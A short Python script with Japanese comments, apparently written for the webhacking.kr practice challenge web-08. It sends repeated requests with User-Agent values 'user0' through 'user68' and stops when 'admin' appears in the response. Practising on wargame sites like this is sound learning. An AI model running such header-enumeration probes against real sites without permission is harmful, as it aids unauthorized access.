import requests
import string
import time

# URLの設定
url = "https://webhacking.kr/challenge/web-08/"

# セッションを利用する場合（Cookieなどが必要な場合に備えて）
session = requests.Session()

for char in range(0,69):
    headers = {
        "User-Agent": "user" + str(char)
    }
    response = session.get(url, headers=headers)
    print(response.text)
    # レスポンスの本文をチェック
    if "admin" in response.text:
        print(f"Payload '{char}' found 'admin' in response!")
        break
    time.sleep(0.01)


